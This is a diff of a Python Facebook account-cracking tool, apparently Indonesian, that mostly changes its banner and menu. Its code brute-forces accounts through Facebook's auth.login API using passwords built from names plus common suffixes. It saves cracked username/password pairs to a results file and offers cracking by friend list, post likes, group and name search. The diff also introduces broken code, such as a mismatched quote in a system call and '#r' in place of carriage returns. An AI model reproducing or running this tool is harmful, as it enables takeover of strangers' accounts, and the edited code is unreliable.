@@ -15,17 +15,21 @@ def kata(s):
 def baner():
     time.sleep(0.1)
     kata("""
-    \033[31;1m╔╗╔═╗╦═╗╦╔═                  
-    \033[31;1m║║╠═╣╠╦╝╠╩╗                  
-   \033[31;1m═╩╝╩ ╩╩╚═╩ ╩                  
-              \033[37;1m╔═╗╔╗   ╔═╗╦ ╦╔═╗╔═╗╦╔═╦╔═╗╔═╗
-              \033[37;1m╠╣ ╠╩╗  ║  ╠═╣║ ║║ ║╠╩╗║║╣ ╚═╗
-              \033[37;1m╚  ╚═╝  ╚═╝╩ ╩╚═╝╚═╝╩ ╩╩╚═╝╚═╝
-\033[1;38;5;208m============================================
+ \033[31;1m__  _______ __________             
+ \033[31;1m/ / / / ___// ____/ __ \         \033[32;1mVersi : 9:7         
+\033[31;1m/ / / /\__ \/ __/ / /_/ /         \033[32;1mDevLoper : Faizul Boften   
+\033[31;1m/ /_/ /___/ / /___/ _, _/             
+\033[31;1m\____//____/_____/_/_|_|_____ 
+\033[37;1m/_  __/ ____/ __ \/  |/  / / / / |/ /
+\033[37;1m/ / / __/ / /_/ / /|_/ / / / /|   / 
+\033[37;1m/ / / /___/ _, _/ /  / / /_/ //   |  
+\033[37;1m/_/ /_____/_/ |_/_/  /_/\____//_/|_| 
+
+\033[1;38;5;208m╔════════════════════════════════════════════╗
 \033[31;1m❌DEVLOPER :\033[37;1mFAIZUL BOFTEN
-\033[31;1m❌FACEBOOK "\033[37;1mFAIZUL
+\033[31;1m❌FACEBOOK :\033[37;1mFAIZUL
 \033[31;1m❌WA       :\033[37;1m082271426251
-\033[1;38;5;208m============================================""")
+\033[1;38;5;208m╚════════════════════════════════════════════╝""")
 def balik():
     f=input("\033[00m\t[\033[96mEnter To Back\033[00m]")
     if f == "":
@@ -34,16 +38,16 @@ def balik():
        sys.exit("\033[1;91mexit\033[00m")
 def mbf():
     time.sleep(0.1)
-    print("\033[37;1m╔════════════════════════════════════════════╗")
-    print("\033[00m[\033[93m1\033[00m] Login")
-    print("\033[00m[\033[93m2\033[00m] Update")
-    print("\033[00m[\033[93m3\033[00m] Group WA")
-    print("\033[00m[\033[93m4\033[00m] Exit")
-    print("\033[37;1m╚════════════════════════════════════════════╝")     
-    time.sleep(0.1)
+    print("\033[32;1m╔═════════════════════════════════╗")
+    print("\033[00m[\033[32;1m1\033[35;1m] Login")
+    print("\033[00m[\033[32;1m2\033[35;1m] Update")
+    print("\033[00m[\033[32;1m3\033[35;1m] Youtube Author")
+    print("\033[00m[\033[32;1m4\033[35;1m] Exit")
+    print("\033[32;1m╚════════════════════════════════╝")     
+    time.sleep(0.5)
     f=input("\n\033[90m> \033[1;93m")
     if f == "1":
-         print("\033[1;94m===========================================\033[00m")
+         print("\033[32;1m═════════════════════════════════════════")
          mbasic = 'https://mbasic.facebook.com{}'
          global die,check,result, count
          id = []
@@ -95,7 +99,7 @@ def mbf():
              api = 'https://b-api.facebook.com/method/auth.login'
              response = requests.get(api, params=params)
              if 'EAA' in response.text:
-                 print(f"\r\033[00m[\033[1;32m✓\033[00m] \033[1;32m{username} \033[90m=> \033[1;32m{password}                       ",end="")
+                 print(f"#r\033[00m[\033[1;32m✓\033[00m] \033[1;32m{username} \033[90m=> \033[1;32m{password}                       ",end="")
                  print()
                  result += 1
                  if cek:
@@ -104,7 +108,7 @@ def mbf():
                         with open('results-life.txt','a') as f:
                                 f.write(username + '|' + password + '\n')
              elif 'www.facebook.com' in response.json()['error_msg']:
-                   print(f"\r\033[00m[\033[1;91mx\033[00m] \033[1;33m{username} \033[90m=> \033[1;33m{password}                    ",end="")
+                   print(f"#r\033[00m[\033[1;91mx\033[00m] \033[1;33m{username} \033[90m=> \033[1;33m{password}                    ",end="")
                    print()
                    check += 1
                    if cek:
@@ -115,7 +119,7 @@ def mbf():
              else:
                    die += 1
              for i in list('\|/-•'):
-                            print(f"\r\033[00m[\033[1;91m{i}\033[00m] Life : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcheckpoint : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;91m{str(die)}\033[90m)\033[00m",end="")
+                            print(f"#r\033[00m[\033[1;91m{i}\033[00m] Life : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcheckpoint : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;91m{str(die)}\033[90m)\033[00m",end="")
                             time.sleep(0.2)
          def getid(url):
              raw = requests.get(url,cookies=kuki).content
@@ -182,15 +186,15 @@ def mbf():
                    kuki = {'cookie':kukis}
                    clear()
                    baner()
-                   kata('\033[31;1m=====================================================')
-                   kata('\033[1;97m{\33[1;95m01\033[1;97m}\033[31;1mCRACK DAFTAR TEMAN')
-                   kata('\033[1;97m{\033[1;95m02\033[1;97m}\033[37;1mCRACK LIKE/POST')
-                   kata('\033[1;97m{\033[1;95m03\033[1;97m}\033[31;1mCRACK DARI PENCARIAN NAMA')
-                   kata('\033[1;97m{\033[1;95m04\033[1;97m}\033[37;1mCRACK DARI GRUB')
-                   kata('\033[1;97m{\033[1;95m05\033[1;97m}\033[31;1mCRACK DARI GRUB')
-                   kata('\033[1;97m{\033[1;95m05\033[1;97m}\033[37;1mCRACK DARI  TEMAN')
-                   kata('\033[1;97m{\033[1;95m05\033[1;97m}\033[31;1mLIAT  HASIL DUMP')
-                   kata('\033[31;1m=======================================================')
+                   kata('\033[31;1m╔═══════════════════════════════════════════════════════╗')
+                   kata('\033[1;97m{\33[1;95m01\033[1;97m}\033[32;1mCRACK DAFTAR TEMAN')
+                   kata('\033[1;97m{\033[1;95m02\033[1;97m}\033[32;1mCRACK LIKE/POST')
+                   kata('\033[1;97m{\033[1;95m03\033[1;97m}\033[32;1mCRACK DARI PENCARIAN NAMA')
+                   kata('\033[1;97m{\033[1;95m04\033[1;97m}\033[32;1mCRACK DARI GRUB')
+                   kata('\033[1;97m{\033[1;95m05\033[1;97m}\033[32;1mCRACK DARI ID PUBLIC')
+                   kata('\033[1;97m{\033[1;95m05\033[1;97m}\033[32;1mCRACK DARI  TEMAN')
+                   kata('\033[1;97m{\033[1;95m05\033[1;97m}\033[32;1mLIAT  HASIL DUMP')
+                   kata('\033[31;1m╚═══════════════════════════════════════════════════════╝')
                    print()
                    tanya = input('\033[90m> \033[1;93m ')
                    if tanya =="":
@@ -269,17 +273,7 @@ def mbf():
                                                   str(x) + '123456',
                                                   str(x) + '12',
                                                   str(x) + 'kontol',
-                                                  str(x) + 'kontol23',
-                                                  str(x) + 'Freefire123',
-                                                  str(x) + 'boyah',
-                                                  str(x) + 'katasandi',
-                                                  str(x) + 'katasandilupa',
-                                                  str(x) + 'nation',
-                                                  str(x) + 'editor',
-                                                  str(x) + '08',
-                                                  str(x) + '17',
-                                                  str(x) + '54321',
-                                                  str(x) + '1234567',
+                                                  str(x) + '12739108',
                                                   ]
                                           listpass.append(expass)
                                           for passw in set(listpass):
@@ -307,7 +301,7 @@ def mbf():
          balik()
 
     elif f == "3":
-         os.system("xdg-open https://chat.whatsapp.com/D4OnRzcSpfP9PxUuMqr64d")
+         os.system("xdg-open https://www.youtube.com/channel/UCSxkYGsMV5DvXz4GQJskl9Q')
          balik()
 
     elif f == "4":
